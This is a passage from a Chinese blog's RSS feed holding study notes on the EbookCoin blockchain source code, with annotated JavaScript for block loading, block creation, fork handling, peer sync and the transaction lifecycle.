定义区块操作函数的具体实现</p><p>block.js 定义区块这个基本的对象结构</p><p>loader.js 用来处理区块链同步事件</p><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>栈用来表示一个有前后顺序的结构,在btc里面把链作为了栈的演化,第一个区块作为栈底,后面的区块按时间顺序一次的在其上面堆叠,这样 就是区块高度的这词的由来.</p><p>分叉:新区块传播时间差导致/人为分叉(系统规则改变)/软硬分叉</p><p><strong>堆栈方式理解数据结构,并且采用自引用的关联方式设计数据库模型,和加密解密技术,而且运行在一个P2P的网络上,有大家共同的进行维护才是一个区块链</strong></p><p>区块链产品的特点:</p><ul><li>分布式存储</li><li>公开透明</li><li>无法篡改</li><li>方便追溯</li></ul><p>区块链设计实际要解决的问题</p><ul><li>加载本地的区块文件<ul><li>保存创世区块</li><li>加载本地区块链</li><li>验证本地区块链</li></ul></li><li>处理新区块<ul><li>创建新区块</li><li>写入区块交易</li><li>区块入链</li><li>处理区块链分叉</li></ul></li><li>同步区块链<ul><li>保持本地的区块链与网络中的区块链同步</li></ul></li></ul><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><h4 id="本地区块文件"><a href="#本地区块文件" class="headerlink" title="本地区块文件"></a>本地区块文件</h4><ul><li><p><strong>创世区块</strong></p><p>  这里就是区块链高度是0的区块的构造函数,在启动区块链的服务的实话,会创建这个实例.其中是指定了创世区块的编码.</p><pre><code>function Blocks(cb, scope) {    library = scope;    genesisblock = library.genesisblock;    self = this;    self.__private = privated;    privated.attachApi();    privated.saveGenesisBlock(function (err) {        setImmediate(cb, err, self);    });}</code></pre><p>  其具体的内容在GensisBlock里面保存着.创世去看也是一个标准区块,和普通的区块没有什么实质性的差别,其中也保存着一些交易,是对账户的初始化,和其中测试的一些内容</p><pre><code>{  &quot;version&quot;: 0,  &quot;totalAmount&quot;: 10000000000000000,  &quot;totalFee&quot;: 0,  &quot;payloadHash&quot;: &quot;f14eafcab4ce055b04f369fcc9c1afd31dd8903f1fc7cf6674a1b6e833d200d1&quot;,  &quot;timestamp&quot;: 0,  &quot;numberOfTransactions&quot;: 103,  &quot;payloadLength&quot;: 20326,  &quot;previousBlock&quot;: null,  &quot;generatorPublicKey&quot;: &quot;c79750916ed4c2b6dc4a3fe9e30efbc9cf58607f4420dc64454ece02a08e1fb5&quot;,  &quot;transactions&quot;: [    ...                  },      &quot;signature&quot;: &quot;e1712ea3ea45534b582c9d42b4e0dafb65615d569cd7ffd6b886533d2c3a60ec24f715126dfc0e1d54b6d98cf22fb1698fa9e6e57b28e1e1770c39f74f2e160c&quot;,      &quot;id&quot;: &quot;3491871562583833419&quot;    }  ],  &quot;height&quot;: 1,  &quot;blockSignature&quot;: &quot;b7312773191f876cd69b31a2b4815755a77b05df49e23b3c10dad2e3ff220478b46d1825df552c9ea48771a19a6efa1bf5882c92917c9b65324875c831515c06&quot;,  &quot;id&quot;: &quot;15719620766428602938&quot;}</code></pre></li><li><p><strong>区块文件加载</strong></p><p>  加载本地的数据库文件,先是查询数据库,之后进行解析</p><pre><code>Blocks.prototype.loadBlocksOffset = function (limit, offset, verify, cb) {    var newLimit = limit + (offset || 0);    var params = {limit: newLimit, offset: offset || 0};    library.dbSequence.add(function (cb) {        library.dbLite.query(&quot;SELECT &quot; +            &quot;b.id, b.version, b.timestamp, b.height, b.previousBlock, b.numberOfTransactions, b.totalAmount, b.totalFee, b.reward, b.payloadLength, lower(hex(b.payloadHash)), lower(hex(b.generatorPublicKey)), lower(hex(b.blockSignature)), &quot; +            ...    // 很长的数据库查询语句            &quot;&quot;, params, privated.blocksDataFields, function (err, rows) {            // Notes:            // If while loading we encounter an error, for example, an invalid signature on a block &amp; transaction, then we need to stop loading and remove all blocks after the last good block. We also need to process all transactions within the block.            if (err) {                return cb(err);            }            // 查询结果保存在 row里.后面进行解析            var blocks = privated.readDbRows(rows);            async.eachSeries(blocks, function (block, cb) {                async.series([                    function (cb) {                        // 判断是不是创世区块                        if (block.id != genesisblock.block.id) {                            if (verify) {                                if (block.previousBlock != privated.lastBlock.id) {                                    return cb({                                        message: &quot;Can&apos;t verify previous block&quot;,                                        block: block                                    });                                }                                try {                                    // 这里对整个链进行交易                                    var valid = library.logic.block.verifySignature(block);                                }                                 ...    // 这里如果区块校验失败.那么删除当前区块,和后面的区块                                if (!valid) {                                    // Need to break cycle and delete this block and blocks after this block                                    return cb({                                        message: &quot;Can&apos;t verify signature&quot;,                                        block: block                                    });                                }                                modules.delegates.validateBlockSlot(block, function (err) {                                    if (err) {                                        return cb({                                            message: &quot;Can&apos;t verify slot&quot;,                                            block: block                                        });                                    }                                    cb();                                });                            } else {                                setImmediate(cb);                            }                        } else {                            setImmediate(cb);                        }                    }, function (cb) {                        // 对交易内容进行排序,使得投票和签名交易排在前面                        block.transactions = block.transactions.sort(function (a, b) {                            ... //                            return 0;                        });                        async.eachSeries(block.transactions, function (transaction, cb) {                            if (verify) {                                modules.accounts.setAccountAndGet({publicKey: transaction.senderPublicKey}, function (err, sender) {                                    if (err) {                                        ... //                                     }                                    if (verify &amp;&amp; block.id != genesisblock.block.id) {                                        library.logic.transaction.verify(transaction, sender, function (err) {                                            if (err) {    ...                                            }                                            privated.applyTransaction(block, transaction, sender, cb);                                        });                                    } else {                                        // 不需要验证,或者是创世区块                                        privated.applyTransaction(block, transaction, sender, cb);                                    }                                });                            } else {                                setImmediate(cb);                            }                        }, function (err) {                                if (err) {    // 这里是发生错误的时候                                library.logger.error(err);                                var lastValidTransaction = block.transactions.findIndex(function (trs) {                                    return trs.id == err.transaction.id;                                });                                var transactions = block.transactions.slice(0, lastValidTransaction + 1);                                // 进行数据回滚                                /// ...                            } else {                                privated.lastBlock = block;    // 更新区块                                modules.round.tick(privated.lastBlock, cb);                            // ...</code></pre></li></ul><pre><code>这里是区块的签名校验的函数,可以清楚的看到,对区块的合法性的校验,是基于对取 hash 的值的的校验.    Block.prototype.verifySignature = function (block) {        var remove = 64;        try {            var data = this.getBytes(block);            var data2 = new Buffer(data.length - remove);            for (var i = 0; i &lt; data2.length; i++) {                data2[i] = data[i];            }            var hash = crypto.createHash(&apos;sha256&apos;).update(data2).digest();            //保存其hesh            var blockSignatureBuffer = new Buffer(block.blockSignature, &apos;hex&apos;);            var generatorPublicKeyBuffer = new Buffer(block.generatorPublicKey, &apos;hex&apos;);            // 验证hash            var res = ed.Verify(hash, blockSignatureBuffer || &apos; &apos;, generatorPublicKeyBuffer || &apos; &apos;);        } catch (e) {            throw Error(e.toString());        }        return res;    }</code></pre><h4 id="新区块"><a href="#新区块" class="headerlink" title="新区块"></a>新区块</h4><ul><li><p>创建新区块</p><p>  在创建一个新的区块，对待打包的交易数据进行校验，合法的校验将会被打包到区块中去，后面的process函数，负责区块信息的后面的处理。</p><pre><code>Blocks.prototype.generateBlock = function (keypair, timestamp, cb) {    var transactions = modules.transactions.getUnconfirmedTransactionList();    var ready = [];    // 这里是一个each的用法,用于遍历这个待处理的交易    async.eachSeries(transactions, function (transaction, cb) {        // 先检验sender的合法性        modules.accounts.getAccount({publicKey: transaction.senderPublicKey}, function (err, sender) {            if (err || !sender) {                return cb(&quot;Invalid sender&quot;);            }            if (library.logic.transaction.ready(transaction, sender)) {                // 这里对交易进行交易,图个合法之后我们把他压入已确认的区块中                library.logic.transaction.verify(transaction, sender, function (err) {                    ready.push(transaction);                    cb();                });            } else {                setImmediate(cb);            }        });    }, function () {        try {            // 之后就是创建这个区块了            var block = library.logic.block.create({                keypair: keypair,                timestamp: timestamp,                previousBlock: privated.lastBlock,                transactions: ready // 已准备好的交易            });        } catch (e) {            return setImmediate(cb, e);        }        // 处理其他字段        self.processBlock(block, true, cb);    });};</code></pre><p>  在这里，没有使用像btc一样的<strong>默克尔树</strong>的结构，看样子是直接的一个list的形式。</p><p>  Process 是对区块的其他的属性进行的处理的函数。从上面的代码可以看出，主要的部分有：keypair，timestamp，previous，和已经OK了的交易记录 ready。函数中是有大量的判断语句，所以这里从简分析</p><pre><code>Blocks.prototype.processBlock = function (block, broadcast, cb) {    ...    privated.isActive = true; // 区块在处理    library.balancesSequence.add(function (cb) {        try {            block.id = library.logic.block.getId(block);        }     // 链高度增长    block.height = privated.lastBlock.height + 1;    // 这里命名可能有点不合理，实际上应该是判断是不是该对当前块内容进行撤销    modules.transactions.undoUnconfirmedList(function (err, unconfirmedTransactions) {        // 这里是发生撤销的闭包回调        function done(err) {            modules.transactions.applyUnconfirmedList(unconfirmedTransactions, function () {                privated.isActive = false;                setImmediate(cb, err);        });        // 这里是对于错误情况的判断        // 区块前驱不合法        if (!block.previousBlock &amp;&amp; block.height != 1) {            return setImmediate(done, &quot;Invalid previous block&quot;);        }        var expectedReward = privated.milestones.calcReward(block.height);        // 区块奖励不合法        if (block.height != 1 &amp;&amp; expectedReward !== block.reward) {            return setImmediate(done, &quot;Invalid block reward&quot;);        }        // 本地数据库中查询        library.dbLite.query(&quot;SELECT id FROM blocks WHERE id=$id&quot;, {id: block.id}, [&apos;id&apos;], function (err, rows) {            try {                // 验证区块合法性                var valid = library.logic.block.verifySignature(block);            }             // 如果区块的前驱区块(相同的高度)不相同，说明发生了分叉            if (block.previousBlock != privated.lastBlock.id) {                // Fork same height and different previous block                modules.delegates.fork(block, 1);                return done(&quot;Can&apos;t verify previous block: &quot; + block.id);            }            ... //            // 这里是对区块的时间戳的验证，其产生的时间，不能小于前驱，也不能太长            var blockSlotNumber = slots.getSlotNumber(block.timestamp);            var lastBlockSlotNumber = slots.getSlotNumber(privated.lastBlock.timestamp);            if (blockSlotNumber &gt; slots.getSlotNumber() || blockSlotNumber &lt;= lastBlockSlotNumber) {                return done(&quot;Can&apos;t verify block timestamp: &quot; + block.id);            ... //        }    }    ...}</code></pre></li></ul><pre><code>&gt; 问: 怎么叫做日趋一致和准确,如果节点自己取，也许会取到一个完全错的时间&gt; 答: 类似时间之矢（时间戳的链）。如果你挖矿成功，可以自己定义这个区块的时间戳，但是但不能早于上一个区块，也不能过于太晚，否则当区块广播出去后，其他节点发现，时间晚于自己的时间，就有可能拒接该区块。作者：大圣2017链接：https://www.jianshu.com/p/4fbcb87e05b8來源：简书著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</code></pre><h4 id="分叉和同步"><a href="#分叉和同步" class="headerlink" title="分叉和同步"></a>分叉和同步</h4><p><strong>分叉</strong> 当分叉发生的时候，这个是一个事件函数，绑定的是收到区块广播。</p><pre><code>// EventsBlocks.prototype.onReceiveBlock = function (block) {    //  正在同步，就直接忽略    if (modules.loader.syncing() || !privated.loaded) {        return;    }    library.sequence.add(function (cb) {        if (block.previousBlock == privated.lastBlock.id &amp;&amp; privated.lastBlock.height + 1 == block.height) {            // 前驱块高度相等，而且当前块的高度是本地块的后继，即标准区块            library.logger.log(&apos;Recieved new block id: &apos; + block.id + &apos; height: &apos; + block.height + &apos; slot: &apos; + slots.getSlotNumber(block.timestamp) + &apos; reward: &apos; + modules.blocks.getLastBlock().reward);            self.processBlock(block, true, cb);        } else if (block.previousBlock != privated.lastBlock.id &amp;&amp; privated.lastBlock.height + 1 == block.height) {            // Fork right height and different previous block  &lt;&lt;&lt;---发生了分叉 同高度，父块不同            modules.delegates.fork(block, 1);            cb(&quot;Fork&quot;);        } else if (block.previousBlock == privated.lastBlock.previousBlock &amp;&amp; block.height == privated.lastBlock.height &amp;&amp; block.id != privated.lastBlock.id) {            // Fork same height and same previous block, but different block id &lt;&lt;&lt;---发生了分叉 同父块同高度，交易内容(ID)不同             modules.delegates.fork(block, 4);            cb(&quot;Fork&quot;);        } else {            cb();        }    });};</code></pre><p><strong>区块链同步</strong></p><p>节点定时的轮询网络的最新区块高度，从而及时的进行同步</p><pre><code>privated.loadBlocks = function (lastBlock, cb) {    // 这里就是向数据库中的随机节点发送区块高度的请求    modules.transport.getFromRandomPeer({        api: &apos;/height&apos;,        method: &apos;GET&apos;    }, function (err, data) {    //  得到区块高度后        var peerStr = data &amp;&amp; data.peer ? ip.fromLong(data.peer.ip) + &quot;:&quot; + data.peer.port : &apos;unknown&apos;;        if (err || !data.body) {            library.logger.log(&quot;Failed to get height from peer: &quot; + peerStr);            return cb();        }        library.logger.info(&quot;Check blockchain on &quot; + peerStr);        data.body.height = parseInt(data.body.height); // parse解析        // 老规矩的对象正则        var report = library.scheme.validate(data.body, {            type: &quot;object&quot;,            properties: {                &quot;height&quot;: {                    type: &quot;integer&quot;,                    minimum: 0                }            }, required: [&apos;height&apos;]        });        if (!report) {            library.logger.log(&quot;Failed to parse blockchain height: &quot; + peerStr + &quot;\n&quot; + library.scheme.getLastError());            return cb();        }        // 目前的本地高度，比接收到的数据要低        if (bignum(modules.blocks.getLastBlock().height).lt(data.body.height)) { // Diff in chainbases            privated.blocksToSync = data.body.height; // 将会同步到            // 判断本地的最新的区块是不是创世区块，如果是，就完整更新，不是就只是部分更新            if (lastBlock.id != privated.genesisBlock.block.id) { // Have to find common block                privated.findUpdate(lastBlock, data.peer, cb);            } else { // Have to load full db                privated.loadFullDb(data.peer, cb);            }        } else {            cb();        }    });};</code></pre><p>这里就是部分更新的函数实现。</p><pre><code>privated.findUpdate = function (lastBlock, peer, cb) { // 传入了目标同步节点的地址    var peerStr = peer ? ip.fromLong(peer.ip) + &quot;:&quot; + peer.port : &apos;unknown&apos;;    library.logger.info(&quot;Looking for common block with &quot; + peerStr);    // 找到差异的区块高度    modules.blocks.getCommonBlock(peer, lastBlock.height, function (err, commonBlock) {        if (err || !commonBlock) {            return cb(err);        }        library.logger.info(&quot;Found common block &quot; + commonBlock.id + &quot; (at &quot; + commonBlock.height + &quot;)&quot; + &quot; with peer &quot; + peerStr);        // 最新的区块长度，减去共有的区块长度        var toRemove = lastBlock.height - commonBlock.height;        // 差的太大就不从这里更新了，提高稳定性        if (toRemove &gt; 1010) {            library.logger.log(&quot;long fork, ban 60 min&quot;, peerStr);            modules.peer.state(peer.ip, peer.port, 0, 3600);            return cb();        }        var overTransactionList = [];            //...            async.series([                function (cb) {                    if (commonBlock.id != lastBlock.id) {                        modules.round.directionSwap(&apos;backward&apos;, lastBlock, cb);                    } else {                        cb();                    }                },                function (cb) {                    library.bus.message(&apos;deleteBlocksBefore&apos;, commonBlock);                    // 删除共同块之后的侧链(分叉链)                    modules.blocks.deleteBlocksBefore(commonBlock, cb);                },                function (cb) {                    if (commonBlock.id != lastBlock.id) {                        modules.round.directionSwap(&apos;forward&apos;, lastBlock, cb);                    } else {                        cb();                    }                },                function (cb) {                    library.logger.debug(&quot;Loading blocks from peer &quot; + peerStr);                    // 删除侧链之后，从peer加载区块数据，实现自身数据的同步                    modules.blocks.loadBlocksFromPeer(peer, commonBlock.id, function (err, lastValidBlock) {</code></pre><h3 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h3><p>这一部分，实现了一个区块链的运行时的操作处理，是对比前面所有部分的一个综合应用。</p><p>实现了本地区块的加载，新区块的生成，以及分叉的处理，及区块同步。</p><p>原理，在注释和代码阅读时候，可以基本的理解，不过，其具体的实现细节，的确还是比较复杂的。</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>竟然把两周过的如此之快。悔之</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/05/28/BC_EbookCoin_0x7/#disqus_thread</comments>
    </item>
    
    <item>
      <title>EbookCoin 源码 0x6</title>
      <link>https://www.diglp.xyz/2018/05/16/BC_EbookCoin_0x6/</link>
      <guid>https://www.diglp.xyz/2018/05/16/BC_EbookCoin_0x6/</guid>
      <pubDate>Tue, 15 May 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这次的一个period是基于《Nodejs区块链开发》这本书的的区块链项目–亿书，的源码学习笔记</p><blockquote><p>EbookCoin<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Vib29rY29pbi9lYm9va2NvaW4uZ2l0" title="https://github.com/Ebookcoin/ebookcoin.git">项目地址<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>通过前面的文章知道了，交易在区块链体系下实际上是一个泛化。其实指的是数据在链上的状态，和操作过程。所以交易这个功能，是相当于前面的所以的东西的一种综合显得尤为重要。在书中也是摊牌，说第13/14章的确是存在着细节的隐瞒。这里要深入的学习了。</p><hr><p>在比特币体系下的一个简单的交易其实现的功能，简单说，就是把比特币从一个账户转移到另一个账户，并且其中的部分金额被作为矿工费用给了负责进行交易校验的矿工。</p><p>更为深入的讲解其过程实际上是，一笔已经被签名了的 <strong>交易</strong> 被用户广播到区块链网络上去。之后由矿工进行收集和封包，到区块中去，最终进行PoW过程，得到正确的Hash后，区块将会永远的被写入到链上。  </p><p>在区块链中的交易，实际上只是一串字节码，其中是没有任何的机密信息，比如私钥或者密码。所以他可以是任何的记录形式，只要这个数据记录在了区块链的网络上。<strong>发送者不需要信任任何广播该交易的节点，同时节点也不需要信任任何广播该交易的发送者</strong></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><ul><li>./modules/transactions.js</li><li>./logic/transaction.js</li><li>./helper/transaction-types.js</li></ul><p>transactions.js 交易过程进行所需要的模块</p><p>transaction.js 实现一个交易的对象结构</p><p>transaction-types.js 一个辅助定义，用于类似的宏的的一个交易类型定义。</p><h3 id="重要理论"><a href="#重要理论" class="headerlink" title="重要理论"></a>重要理论</h3><ul><li><p><strong>交易的生命周期</strong></p><p>  在链上的吊椅其目的是，正确的生成，传播和验证，并且最终入链。所以在其开发的角度讲：一次交易有以下的过程</p><ul><li>生成交易，如前面提到的一条交易信息</li><li>广播到网络，所有网络节点都会获得交易数据</li><li>验证交易，验证交易的合法性，不合法的交易信息是不予打包的</li><li><p>写入区块链中</p><p>所以，可见交易时整个区块链系统的灵魂，一笔交易的实现，综合了前面的所有的内容，p2p， 签名， 加密。。。等等。</p></li></ul></li></ul><hr><ul><li><p><strong>交易类型</strong>    </p><p>  实际上交易在区块链时泛化的，其不一定时特指的时价值的传递和转移。</p><p>  不过不严谨的说 BTC 只是实现了BTC可以在不同的账户之间流动的交易过程，所以其交易种类时比较单一的。</p><p>  不过我们既然是要拓展区块链的功能，那么我们在这里可以定义更多的交易过程。实际上，交易的实指，就是一次合法的信息被计入区块链的过程。</p><hr><p>  这里可能称之其为宏可能不是十分的合适，不过从功能上讲的确是实现了宏的功能。</p><pre><code>module.exports = {    SEND : 0,    SIGNATURE : 1,    DELEGATE : 2,    VOTE : 3,    USERNAME : 4,    FOLLOW : 5,    MULTI: 6,    DAPP: 7,    IN_TRANSFER: 8,    OUT_TRANSFER: 9,    ARTICALE: 10,    EBOOK: 11,     BUY: 12,    READ: 13}</code></pre><p>  其实这个也不陌生，前面的 <code>transaction.create</code> 里面已经包含了这个交易的种类。像是签名(SIGNATURE).SEND是基本的转账交易，。。。</p></li></ul><hr><ul><li><p><strong>交易流程</strong></p><p>  <strong>生成,签名,广播,校验,入链,这个是区块链上一个交易的声明周期</strong>    </p><p>  这里是前面常见的一个东西，就是我们的交易创建，这里也向我们展示了一笔交易的实际结构.</p><pre><code>var transaction = library.logic.transaction.create({    type: TransactionTypes.SEND,    // 交易类型    amount: body.amount,            //     sender: account,                // 发送者地址    recipientId: recipientId,        // 接收方地址    recipientUsername: recipientUsername,    keypair: keypair,    requester: keypair,    secondKeypair: secondKeypair}</code></pre><p>  对一个合法的交易进行 <strong>签名</strong>,其中要记录其交易时间戳,用于追溯,接着就生成了交易ID,这个ID是及其复杂的,不会像数据库一样是生成的顺序的序号,是一种默克尔树的索引结构.</p><p>  合法性校验,每笔被广播到网络上的交易,会被节点收集,进行合法性校验,不合法的交易信息是无法被打包的,合法的交易信息,会加入当前的区块.等待<strong>网络心跳</strong> 从而开始求解当前区块.</p><p>  这里涉及到<strong>双花</strong>的问题, 双花,说明了就是一笔钱花两次.在比特币历史上是出现过双花的问题,不过在至今网络稳定的情况下.这种可能性发生的就会很小了. </p><p>  其实实现的过程如下,我们在一个区块时间内<strong>对一笔钱</strong>进行两次交易的广播,这交易信息,可能是会被不同的节点记录和接收,这里我们把这两个节点之间的差异,叫做形成了分叉. 所以,当区块产生之后,就会由另个不同的区块.当一个区块已经被确认之后,比如说,A收到了B的钱.可是此时,A拥有更强的算力,使得另一个分叉变成了最长链,这样.给B的转账就是变成无效化的了.这就是双花攻击</p><p>  笔者,其实也在一个 新的 PoW 项目中遭遇了类似的问题,不过其主要原因不是,节点作恶e,而是网络分区.</p></li></ul><hr><ul><li><p><strong>广播点到点网络</strong></p><p>  一但有交易广播,我们的接收到的节点,就把他分送到所有的 peerlist 的节点,具体的过程,是把信息 post 到节点的 /api/peer/transaction 这个接口去.</p></li></ul><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><ul><li><p><strong>API</strong></p><p>  这个地方的代码就是十分重要和综合的了,这里实现了一个完整的交易.</p><p>  先从交易的API入手,来拆解一个交易过程的实现原理</p><pre><code>router.map(shared, {            &quot;get /&quot;: &quot;getTransactions&quot;,            &quot;get /get&quot;: &quot;getTransaction&quot;,            &quot;get /unconfirmed/get&quot;: &quot;getUnconfirmedTransaction&quot;,            &quot;get /unconfirmed&quot;: &quot;getUnconfirmedTransactions&quot;,            &quot;put /&quot;: &quot;addTransactions&quot;        });        library.network.app.use(&apos;/api/transactions&apos;, router);</code></pre></li></ul><ul><li><p><strong>添加交易</strong>        </p><p>  从请求方式我们么一看出,实际上 这个<strong>put</strong> 是上传数据的,就是写数据,所以这里贴上其代码,进行深入分析</p><pre><code>shared.addTransactions = function (req, cb) {    var body = req.body;    library.scheme.validate(body, {        type: &quot;object&quot;,        properties: {            ...    // 对象结构的合法性检测            },        required: [&quot;secret&quot;, &quot;amount&quot;, &quot;recipientId&quot;]    }, function (err) {        if (err) {            return cb(err[0].message);        }        // 出现了很多遍的验证密码的过程        var hash = crypto.createHash(&apos;sha256&apos;).update(body.secret, &apos;utf8&apos;).digest();        var keypair = ed.MakeKeypair(hash);        if (body.publicKey) {            if (keypair.publicKey.toString(&apos;hex&apos;) != body.publicKey) {                return cb(&quot;Invalid passphrase&quot;);            }        }        var query = {};        // 进行地址正则, 不是地址,就是用户别名 (接收方 reception)        var isAddress = /^[0-9]+[L|l]$/g;        if (isAddress.test(body.recipientId)) {            query.address = body.recipientId;        } else {            query.username = body.recipientId;        }        // 在序列中进行添加        library.balancesSequence.add(function (cb) {            // 注意这个 query,这里是获取(**验证**)接收方的账户            modules.accounts.getAccount(query, function (err, recipient) {                if (err) {                    return cb(err.toString());                }                // 如果不存在接收方,之间返回交易时不会发生的                if (!recipient &amp;&amp; query.username) {                    return cb(&quot;Recipient not found&quot;);                }                var recipientId = recipient ? recipient.address : body.recipientId;                var recipientUsername = recipient ? recipient.username : null;                //这里对发送方的账户合法性进行检验                if (body.multisigAccountPublicKey &amp;&amp; body.multisigAccountPublicKey != keypair.publicKey.toString(&apos;hex&apos;)) {                    // 如果时多重签名的情况                    modules.accounts.getAccount({publicKey: body.multisigAccountPublicKey}, function (err, account) {                        if (err) {                            return cb(err.toString());                        }                        // 账户不存在                        if (!account || !account.publicKey) {                            return cb(&quot;Multisignature account not found&quot;);                        }                        if (!account || !account.multisignatures) {                            return cb(&quot;Account does not have multisignatures enabled&quot;);                        }                        // 账户不存在于签名组                        if (account.multisignatures.indexOf(keypair.publicKey.toString(&apos;hex&apos;)) &lt; 0) {                            return cb(&quot;Account does not belong to multisignature group&quot;);                        }                        // 继续验证发送方                        modules.accounts.getAccount({publicKey: keypair.publicKey}, function (err, requester) {                            if (err) {                                return cb(err.toString());                            }                            //                             if (!requester || !requester.publicKey) {                                return cb(&quot;Invalid requester&quot;);                            }                            if (requester.secondSignature &amp;&amp; !body.secondSecret) {                                return cb(&quot;Invalid second passphrase&quot;);                            }                            if (requester.publicKey == account.publicKey) {                                return cb(&quot;Invalid requester&quot;);                            }                            var secondKeypair = null;                            if (requester.secondSignature) {                                var secondHash = crypto.createHash(&apos;sha256&apos;).update(body.secondSecret, &apos;utf8&apos;).digest();                                secondKeypair = ed.MakeKeypair(secondHash);                            }                            try {                                // 这里创建交易,                                // 其中的信息有以上描述的许多                                var transaction = library.logic.transaction.create({                                    type: TransactionTypes.SEND,                                    amount: body.amount,                                    sender: account,                                    recipientId: recipientId,                                    recipientUsername: recipientUsername,                                    keypair: keypair,                                    requester: keypair,                                    secondKeypair: secondKeypair                                });                            } catch (e) {                                return cb(e.toString());                            }                            // 这里的处理很重要                            modules.transactions.receiveTransactions([transaction], cb);                        });                    });                } else {                    // 如果时普通签名的情况                    modules.accounts.getAccount({publicKey: keypair.publicKey.toString(&apos;hex&apos;)}, function (err, account) {                    // 基本同上                    });                }            });        }, function (err, transaction) {            if (err) {                return cb(err.toString());            }            cb(null, {transactionId: transaction[0].id});        });    });}</code></pre><p>  当我们完成了一系列的操作后产生了一个交易的条目(<code>var transaction</code>),在最后,使用了    </p><pre><code>modules.transactions.receiveTransactions([transaction], cb);</code></pre><p>  对这个产生的交易对象进行处理</p><pre><code>Transactions.prototype.receiveTransactions = function (transactions, cb) {    // 使用串行调度, 对transactions 的所有的 transaction 进行遍历    async.eachSeries(transactions, function (transaction, cb) {        // 未经确认的交易处理函数        self.processUnconfirmedTransaction(transaction, true, cb);    }, function (err) {        cb(err, transactions);    });}</code></pre><p>  上面的是交易处理函数,处理遍历交易列表每笔交易,下面是单笔交易的处理函数</p><pre><code>Transactions.prototype.processUnconfirmedTransaction = function (transaction, broadcast, cb) {    // 获取交易发送者的账户公钥    modules.accounts.setAccountAndGet({publicKey: transaction.senderPublicKey}, function (err, sender) {        // 注意,这里是定义的一个函数,实际上是在最后进行的操作,闭包函数第一次遇到,后面有总结        function done(err) {            if (err) {                return cb(err);            }            // 这里是完成后的过程,在最后...            // 这里执行的是把这个交易加入当前的区块            privated.addUnconfirmedTransaction(transaction, sender, function (err) {                if (err) {                    return cb(err);                }                // 在总线上发送一个未确认的交易的消息                library.bus.message(&apos;unconfirmedTransaction&apos;, transaction, broadcast);                cb();            });        }        if (err) {            return done(err);        }        // 一样的发送者的合法性,以及检验多重签名检验        if (transaction.requesterPublicKey &amp;&amp; sender &amp;&amp; sender.multisignatures &amp;&amp; sender.multisignatures.length) {            modules.accounts.getAccount({publicKey: transaction.requesterPublicKey}, function (err, requester) {                //同下            });        } else {            // 开始交易检验和处理            library.logic.transaction.process(transaction, sender, function (err, transaction) {                if (err) {                    return done(err);                }                // 这里进行双花检验,同一个ID的交易,不允许出现两次                if (privated.unconfirmedTransactionsIdIndex[transaction.id] !== undefined || privated.doubleSpendingTransactions[transaction.id]) {                    return cb(&quot;Transaction already exists&quot;);                }                // 该交易已经通过校验,之后对 DONE 进行回调实现了交易的打包                library.logic.transaction.verify(transaction, sender, done);            });        }    });}</code></pre><hr><blockquote><p><strong>闭包函数</strong>:有权访问另一个函数作用域内变量的函数都是闭包</p><p>我们知道，js的每个函数都是一个个小黑屋，它可以获取外界信息，但是外界却无法直接看到里面的内容。将变量 n 放进小黑屋里，除了 inc 函数之外，没有其他办法能接触到变量 n，而且在函数 a 外定义同名的变量 n 也是互不影响的，这就是所谓的增强“封装性”。</p></blockquote><p>  简单说,在一个函数的包里,实现了另一个函数,之前在一个python里面也是看见了这种闭包的写法</p><p>  这里还的调用栈中出现了 <code>process</code> 和 <code>verify</code></p><p>  Process 函数的实现就比较简单</p><pre><code>this.process = function (trs, sender, cb) {    setImmediate(cb, null, trs);}    </code></pre><p>  在上面的进行的是立即执行回调,可能是便于重用</p><p>  verify 函数 进行交易的 recipient 的地址和法检测,并且判断,转账的金额小于 0</p><pre><code>this.verify = function (trs, sender, cb) {    var isAddress = /^[0-9]+[L|l]$/g;    if (!isAddress.test(trs.recipientId.toLowerCase())) {        return cb(&quot;Invalid recipient&quot;);    }    if (trs.amount &lt;= 0) {        return cb(&quot;Invalid transaction amount&quot;);    }    cb(null, trs); // 完成之后回调,那个闭包的 done}</code></pre><hr><p>  这里贴出 Done 函数, 分析交易校验完成之后的操作</p><pre><code>function done(err) {    if (err) {        return cb(err);    }    // 这里是完成后的过程,在最后...    // 这里执行的是把这个交易加入当前的区块    privated.addUnconfirmedTransaction(transaction, sender, function (err) {        if (err) {            return cb(err);        }        // 在总线上发送一个未确认的交易的消息        library.bus.message(&apos;unconfirmedTransaction&apos;, transaction, broadcast);        cb();    });}</code></pre></li></ul><pre><code>privated.addUnconfirmedTransaction = function (transaction, sender, cb) {    self.applyUnconfirmed(transaction, sender, function (err) {        if (err) {            self.addDoubleSpending(transaction);            return setImmediate(cb, err);        }        privated.unconfirmedTransactions.push(transaction);    // 这里在当前的区块里把交易压入,即打包        var index = privated.unconfirmedTransactions.length - 1;         privated.unconfirmedTransactionsIdIndex[transaction.id] = index; // 添加交易索引        setImmediate(cb); //立即执行后面的回调    });}</code></pre><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>在这个部分,是真正的实现了一次链上的交易, 整个过程从交易的产生,到处理,校验,和打包广播.基本上是实现了一个交易的生命周期.整个过程是十分精彩的.</p><p>从客户端调用API向节点发送 交易信息,到交易被创建,检验,打包,发送.这几个过程.都很好的展现了出来</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/05/16/BC_EbookCoin_0x6/#disqus_thread</comments>
    </item>
    
    <item>
      <title>EbookCoin 源码 0x5</title>
